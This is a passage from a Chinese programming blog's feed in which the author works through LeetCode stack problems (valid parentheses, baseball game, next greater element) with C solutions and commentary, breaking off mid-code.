    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;动态规划&lt;/strong&gt;（&lt;strong&gt;Dynamic Programming&lt;/strong&gt;）是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。同时也是各类信息学竞赛（ Olympiad in Informatics ）中较为常用的算法之一。&lt;/p&gt;
&lt;p&gt;作为前·蒟蒻·OIer，对动态规划也是稍微了解一点点的XD，所以现在来简单刷一刷leetcode上动态规划的题Or2&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最后更新日期2020.9.7&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="动态规划" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0002-Leetcode】栈部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0002-Leetcode%E3%80%91%E6%A0%88%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0002-Leetcode%E3%80%91%E6%A0%88%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-05T19:38:25.000Z</published>
    <updated>2020-09-25T17:38:04.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><strong>栈</strong>（<strong>stack</strong>）是在任何的数据结构课本当中都会花一定篇幅来讲述的数据结构之一，作为一种抽象数据结构，无论是在算法应用（逆波兰表达式等）、计组原理（函数调用栈等）还是在安全领域（栈溢出等）都能见到这一抽象数据结构的身影。</p><p>上一篇关于Leetcode的博文里我们刷了简单线性表——单向链表的有关题目，那么这一次来刷一刷<strong>受限线性表</strong>——栈的有关题目叭2333333.</p><blockquote><p>注：这个绪论是在半夜写的，可能我其实还没开始做题，如果你看到文章字数不到一千字的话可以先🦄住等后续的更新XD</p><p>注2：当晚回来打自己脸，写完绪论之后马上肝了几道题23333</p><p>注3：出于一些奇怪的原因，我会优先选择面试题</p><p>注4：点击标题可以直接进入原题网址</p></blockquote><blockquote><p>最后更新日期：2020.9.6</p></blockquote><a id="more"></a><h2 id="pre-栈的简单构造形式"><a href="#pre-栈的简单构造形式" class="headerlink" title="pre.栈的简单构造形式"></a>pre.栈的简单构造形式</h2><p>我们都知道栈是一种<strong>受限线性表——后进先出表</strong>（<strong>Last In First Out，LIFO</strong>），我们常常喜欢使用<strong>“将一个元素压入栈中”</strong>的说法，在这个受限线性表中，最先进去的元素会被压在最下层，后面进来的元素会一层一层地堆叠起来，而一个元素若是想要出去，则只能“原路返回”：先让压在它上面的元素先逐一出去后，自己才能出去。</p><p>栈的构造大概如下图所示：</p><p><img src="https://i.loli.net/2020/09/06/rN6QjEP5lBH4Cmk.png" alt="image.png"></p><p>在这里我们可以注意到，我们在访问栈时，永远只能直接访问栈顶元素。我们可以联想到在内存管理中我们的stack pointer是永远指向栈帧（stack frame）的栈顶的。（好像有点扯远了XD</p><p>通常情况下，我们可以选择<strong>使用一个数组来模拟一个栈</strong>，并配上一个配套的指向栈顶的指针，这也是最简单的实现一个栈的形式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>[stack_size];</span><br><span class="line"><span class="keyword">int</span> top = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><p>我们同样想到，作为一个受限线性表，我们可以<strong>使用一个链表结构来模拟一个栈</strong>，相比于数组结构而言其优势在于<strong>链表是动态的，不需要像数组那样提前额外地占用过多的内存空间</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Stack;</span><br></pre></td></tr></table></figure><h1 id="0x01-难度：简单"><a href="#0x01-难度：简单" class="headerlink" title="0x01.难度：简单"></a>0x01.难度：简单</h1><h2 id="0x00-有效的括号"><a href="#0x00-有效的括号" class="headerlink" title="0x00.有效的括号"></a>0x00.<a href="https://leetcode-cn.com/problems/valid-parentheses" target="_blank" rel="noopener">有效的括号</a></h2><blockquote><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p><p>有效字符串需满足：</p><p>1、左括号必须用相同类型的右括号闭合。<br>2、左括号必须以正确的顺序闭合。<br>注意空字符串可被认为是有效字符串。</p><p>示例 1:</p><p>输入: “()”<br>输出: true<br>示例 2:</p><p>输入: “()[]{}”<br>输出: true<br>示例 3:</p><p>输入: “(]”<br>输出: false<br>示例 4:</p><p>输入: “([)]”<br>输出: false<br>示例 5:</p><p>输入: “{[]}”<br>输出: true</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/valid-parentheses" target="_blank" rel="noopener">https://leetcode-cn.com/problems/valid-parentheses</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>基本思路：</p><ul><li><p>逐个字符进行匹配</p></li><li><p><strong>遇到左括号：入栈</strong></p></li><li><p><strong>遇到右括号：左括号出栈，与右括号进行匹配，若成功则进行下一轮匹配，失败则返回false</strong></p></li></ul><p>为了保证不溢出，我们首先选择使用链表构造栈，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="keyword">char</span> * str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="literal">NULL</span>||str[<span class="number">0</span>]==<span class="string">'\0'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = <span class="number">-1</span>;</span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ch = str[i];</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">'('</span>||ch == <span class="string">'['</span>||ch==<span class="string">'&#123;'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Stack * temp = (Stack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">            temp-&gt;value = ch;</span><br><span class="line">            temp-&gt;next = s;</span><br><span class="line">            s = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">')'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">'('</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">']'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">'['</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">'&#125;'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">'&#123;'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;value!=<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/MrIq76Sm2ZnAETX.png" alt="image.png"></p><p>空间上似乎不大行的样子，因为使用数组肯定是比使用链表要占用更少的空间</p><p>由于字符串的大小是可知的，故我们可以使用动态数组构造链表，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="keyword">char</span> * str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="literal">NULL</span>||str[<span class="number">0</span>]==<span class="string">'\0'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> * s = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*len+<span class="number">1</span>);<span class="comment">//prevent overflow</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ch = str[i];</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">'('</span>||ch == <span class="string">'['</span>||ch==<span class="string">'&#123;'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            s[top] = ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">')'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">'('</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">']'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">'['</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">'&#125;'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">'&#123;'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(top!=<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/FlLegrRbnudxics.png" alt="image.png"></p><blockquote><p>其实差的也不多嘛…</p></blockquote><h2 id="0x01-棒球比赛"><a href="#0x01-棒球比赛" class="headerlink" title="0x01.棒球比赛"></a>0x01.<a href="https://leetcode-cn.com/problems/baseball-game" target="_blank" rel="noopener">棒球比赛</a></h2><blockquote><p>你现在是棒球比赛记录员。<br>给定一个字符串列表，每个字符串可以是以下四种类型之一：</p><p>1.整数（一轮的得分）：直接表示您在本轮中获得的积分数。</p><ol start="2"><li>“+”（一轮的得分）：表示本轮获得的得分是前两轮有效 回合得分的总和。</li><li>“D”（一轮的得分）：表示本轮获得的得分是前一轮有效 回合得分的两倍。</li><li>“C”（一个操作，这不是一个回合的分数）：表示您获得的最后一个有效 回合的分数是无效的，应该被移除。</li></ol><p>每一轮的操作都是永久性的，可能会对前一轮和后一轮产生影响。<br>你需要返回你在所有回合中得分的总和。</p><p>示例 1:</p><p>输入: [“5”,”2”,”C”,”D”,”+”]<br>输出: 30<br>解释:<br>第1轮：你可以得到5分。总和是：5。<br>第2轮：你可以得到2分。总和是：7。<br>操作1：第2轮的数据无效。总和是：5。<br>第3轮：你可以得到10分（第2轮的数据已被删除）。总数是：15。<br>第4轮：你可以得到5 + 10 = 15分。总数是：30。<br>示例 2:</p><p>输入: [“5”,”-2”,”4”,”C”,”D”,”9”,”+”,”+”]<br>输出: 27<br>解释:<br>第1轮：你可以得到5分。总和是：5。<br>第2轮：你可以得到-2分。总数是：3。<br>第3轮：你可以得到4分。总和是：7。<br>操作1：第3轮的数据无效。总数是：3。<br>第4轮：你可以得到-4分（第三轮的数据已被删除）。总和是：-1。<br>第5轮：你可以得到9分。总数是：8。<br>第6轮：你可以得到-4 + 9 = 5分。总数是13。<br>第7轮：你可以得到9 + 5 = 14分。总数是27。<br>注意：</p><p>输入列表的大小将介于1和1000之间。<br>列表中的每个整数都将介于-30000和30000之间。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/baseball-game" target="_blank" rel="noopener">https://leetcode-cn.com/problems/baseball-game</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这是一道<strong>来自于《剑指Offer》的题目</strong>（<del>简单到初中OIer都能做的题，说实话面试真的会考这种东西🐎，我暂且蒙在古里</del></p><p>求解的算法其实也很简单：</p><ul><li><strong>遇到整数：入栈</strong></li><li><strong>遇到操作数“+”：取栈顶元素的值与位于栈顶元素下方的元素的值，相加得到第三个元素，第三个元素入栈</strong></li><li><strong>遇到操作数“D”：取栈顶元素的值*2，得到新元素，新元素入栈</strong></li><li><strong>遇到操作数“C”：栈顶元素出栈</strong></li></ul><p>（说实话我感觉有点像求解前缀/后缀表达式的解法XD</p><p>因为操作数数量是已知的，故我们可以直接使用数组模拟栈，构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calPoints</span><span class="params">(<span class="keyword">char</span> ** ops, <span class="keyword">int</span> opsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[opsSize+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;opsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">"+"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top] = <span class="built_in">stack</span>[top<span class="number">-1</span>]+<span class="built_in">stack</span>[top<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">"D"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top] = <span class="built_in">stack</span>[top<span class="number">-1</span>]*<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(ops[i],<span class="string">"C"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top] = atoi(ops[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=top;i++)</span><br><span class="line">        result+=<span class="built_in">stack</span>[i];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/s4P1GCldLaNikYQ.png" alt="image.png"></p><h2 id="0x02-下一个更大元素-I"><a href="#0x02-下一个更大元素-I" class="headerlink" title="0x02.下一个更大元素 I"></a>0x02.<a href="https://leetcode-cn.com/problems/next-greater-element-i" target="_blank" rel="noopener">下一个更大元素 I</a></h2><blockquote><p>给定两个 没有重复元素 的数组 nums1 和 nums2 ，其中nums1 是 nums2 的子集。找到 nums1 中每个元素在 nums2 中的下一个比其大的值。</p><p>nums1 中数字 x 的下一个更大元素是指 x 在 nums2 中对应位置的右边的第一个比 x 大的元素。如果不存在，对应位置输出 -1 。</p><p>示例 1:</p><p>输入: nums1 = [4,1,2], nums2 = [1,3,4,2].<br>输出: [-1,3,-1]<br>解释:<br>    对于num1中的数字4，你无法在第二个数组中找到下一个更大的数字，因此输出 -1。<br>    对于num1中的数字1，第二个数组中数字1右边的下一个较大数字是 3。<br>    对于num1中的数字2，第二个数组中没有下一个更大的数字，因此输出 -1。<br>示例 2:</p><p>输入: nums1 = [2,4], nums2 = [1,2,3,4].<br>输出: [3,-1]<br>解释:<br>    对于 num1 中的数字 2 ，第二个数组中的下一个较大数字是 3 。<br>    对于 num1 中的数字 4 ，第二个数组中没有下一个更大的数字，因此输出 -1 。</p><p>提示：</p><p>nums1和nums2中所有元素是唯一的。<br>nums1和nums2 的数组大小都不超过1000。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/next-greater-element-i" target="_blank" rel="noopener">https://leetcode-cn.com/problems/next-greater-element-i</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>num1是num2的子集，我们很容易想到：可以先在num2中对于每一个元素构造一个映射（哈希表），在遍历num1时只需要使用这个映射表即可</p><p>为了避免重复遍历，我们可以选择使用一个<strong>单调栈</strong>来短暂储存遍历中的元素，算法如下：</p><ul><li><strong>任意元素入栈</strong></li><li><strong>遇到比栈顶元素小的元素——入栈</strong></li><li><strong>遇到比栈顶元素大的元素——栈内元素逐一出栈并构造映射，直到栈空或栈顶元素大于所遍历元素，此时该元素入栈</strong></li><li><strong>遍历结束，栈内所有元素出栈并与-1构造映射</strong></li></ul><p>大小可知，还是选择简单的数组模拟栈，构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">nextGreaterElement</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> table[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(top == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top] = i;<span class="comment">//save the index instead of value</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> _top=top;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=_top;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums2[i]&gt;nums2[<span class="built_in">stack</span>[top]])</span><br><span class="line">                &#123;</span><br><span class="line">                    table[<span class="built_in">stack</span>[top]] = nums2[i];</span><br><span class="line">                    top--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(top!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        table[<span class="built_in">stack</span>[top]] = <span class="number">-1</span>;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *arr = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*nums1Size);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums1Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(nums2[index]!=nums1[i])index++;</span><br><span class="line">        arr[i]=table[index];</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = nums1Size;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下，可以看到运行时间上不是那么的理想，因为我们在最后建立Nums1的映射时多次重复遍历，时间复杂度直接提升到O(N^2)</p><p><img src="https://i.loli.net/2020/09/06/JKROlSiaUjCfEFY.png" alt="image.png"></p><p>为了避免重复遍历，我们直接选择<strong>使用数组的值作为映射表的下标</strong>构造映射表数组进行取值，构造代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">nextGreaterElement</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">max</span> = <span class="built_in">abs</span>(nums2[i])&gt;<span class="built_in">max</span>?<span class="built_in">abs</span>(nums2[i]):<span class="built_in">max</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> table[<span class="number">2</span>*<span class="built_in">max</span>+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[nums2Size+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums2Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(top!=<span class="number">-1</span>&amp;&amp;<span class="built_in">stack</span>[top]&lt;nums2[i])</span><br><span class="line">        &#123;</span><br><span class="line">            table[<span class="built_in">max</span>+<span class="built_in">stack</span>[top]] = nums2[i];</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        top++;</span><br><span class="line">        <span class="built_in">stack</span>[top] = 